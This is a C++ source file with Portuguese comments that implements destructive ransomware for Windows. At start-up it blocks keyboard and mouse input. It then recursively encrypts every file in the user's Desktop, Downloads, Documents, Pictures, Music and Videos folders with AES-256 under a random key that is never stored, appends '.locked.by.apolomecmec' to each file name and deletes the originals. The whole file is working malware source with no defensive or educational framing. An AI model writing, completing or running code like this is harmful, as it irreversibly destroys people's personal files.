#include <iostream>
#include <fstream>
#include <vector>
#include <dirent.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string>
#include <cstring>
#include <windows.h>
#include <shlobj.h>

// --- Função para pegar pastas conhecidas ---
std::wstring GetKnownFolder(REFKNOWNFOLDERID folderId) {
    PWSTR path = nullptr;
    if (SUCCEEDED(SHGetKnownFolderPath(folderId, 0, nullptr, &path))) {
        std::wstring result(path);
        CoTaskMemFree(path);
        return result;
    }
    return L"";
}

// --- Conversão de wstring para string ---
std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
    std::string result(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &result[0], size_needed, nullptr, nullptr);
    return result;
}

// --- Funções para obter os caminhos ---
std::string GetDesktopPath()   { return WStringToString(GetKnownFolder(FOLDERID_Desktop)); }
std::string GetDocumentsPath() { return WStringToString(GetKnownFolder(FOLDERID_Documents)); }
std::string GetDownloadsPath() { return WStringToString(GetKnownFolder(FOLDERID_Downloads)); }
std::string GetPicturesPath()  { return WStringToString(GetKnownFolder(FOLDERID_Pictures)); }
std::string GetMusicPath()     { return WStringToString(GetKnownFolder(FOLDERID_Music)); }
std::string GetVideosPath()    { return WStringToString(GetKnownFolder(FOLDERID_Videos)); }

// -------------------- CONFIGURAÇÕES ------------------------
const std::string EXTENSAO_BLOQUEADO = ".locked.by.apolomecmec";

// Diretórios alvo 
const std::vector<std::string> DIRETORIOS_ALVO = {
    GetDesktopPath(),
    GetDownloadsPath(),
    GetDocumentsPath(),
    GetPicturesPath(),
    GetMusicPath(),
    GetVideosPath()
};
// -----------------------------------------------------------

// Verifica se é um diretório
bool ehDiretorio(const std::string& caminho) {
    struct stat statbuf;
    if (stat(caminho.c_str(), &statbuf) != 0) return false;
    return S_ISDIR(statbuf.st_mode);
}

// Criptografa arquivo e adiciona extensão
// Lista de arquivos criptografados
std::vector<std::string> arquivosCriptografados;

// Criptografa arquivo e adiciona extensão
bool criptografarArquivo(const std::string& caminhoOriginal, const std::vector<unsigned char>& chave, const std::vector<unsigned char>& iv) {
    std::ifstream arquivoEntrada(caminhoOriginal, std::ios::binary);
    if (!arquivoEntrada) return false;

    std::vector<unsigned char> conteudo((std::istreambuf_iterator<char>(arquivoEntrada)), std::istreambuf_iterator<char>());
    arquivoEntrada.close();

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, chave.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    std::vector<unsigned char> textoCifrado(conteudo.size() + EVP_CIPHER_CTX_block_size(ctx));
    int tamanhoCifrado = 0;

    if (EVP_EncryptUpdate(ctx, textoCifrado.data(), &tamanhoCifrado, conteudo.data(), conteudo.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    int tamanhoFinal = 0;
    if (EVP_EncryptFinal_ex(ctx, textoCifrado.data() + tamanhoCifrado, &tamanhoFinal) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    tamanhoCifrado += tamanhoFinal;
    textoCifrado.resize(tamanhoCifrado);
    EVP_CIPHER_CTX_free(ctx);

    std::string novoCaminho = caminhoOriginal + EXTENSAO_BLOQUEADO;

    std::ofstream arquivoSaida(novoCaminho, std::ios::binary);
    arquivoSaida.write(reinterpret_cast<const char*>(textoCifrado.data()), textoCifrado.size());
    arquivoSaida.close();

    remove(caminhoOriginal.c_str());

    arquivosCriptografados.push_back(novoCaminho);

    std::cout << "[+] Criptografado: " << novoCaminho << std::endl;
    return true;
}


// Percorre diretórios recursivamente
void percorrerDiretorios(const std::string& caminho, const std::vector<unsigned char>& chave, const std::vector<unsigned char>& iv) {
    DIR* dir = opendir(caminho.c_str());
    if (!dir) {
        std::cerr << "Erro ao abrir diretório: " << caminho << std::endl;
        return;
    }

    struct dirent* entrada;
    while ((entrada = readdir(dir)) != nullptr) {
        std::string nome = entrada->d_name;
        if (nome == "." || nome == "..") continue;

        std::string caminhoCompleto = caminho + "\\" + nome;

        if (ehDiretorio(caminhoCompleto)) {
            percorrerDiretorios(caminhoCompleto, chave, iv); 
        } else {
            if (caminhoCompleto.size() <= EXTENSAO_BLOQUEADO.size() || 
                caminhoCompleto.compare(caminhoCompleto.size() - EXTENSAO_BLOQUEADO.size(), EXTENSAO_BLOQUEADO.size(), EXTENSAO_BLOQUEADO) != 0) {
                criptografarArquivo(caminhoCompleto, chave, iv);
            }
        }
    }
    closedir(dir);
}

// ------------------------ MAIN BlockInput();---------------------------
int main() {
    BlockInput(TRUE);
    std::vector<unsigned char> chave(32); 
    std::vector<unsigned char> iv(EVP_CIPHER_iv_length(EVP_aes_256_cbc()));

    if (RAND_bytes(chave.data(), chave.size()) != 1 || RAND_bytes(iv.data(), iv.size()) != 1) {
        std::cerr << "Erro ao gerar chave/IV." << std::endl;
        return 1;
    }

    for (const auto& dir : DIRETORIOS_ALVO) {
        std::cout << "[*] Processando: " << dir << std::endl;
        percorrerDiretorios(dir, chave, iv);
    }

    std::cout << "[✔] Finalizado." << std::endl;
    return 0;
}
    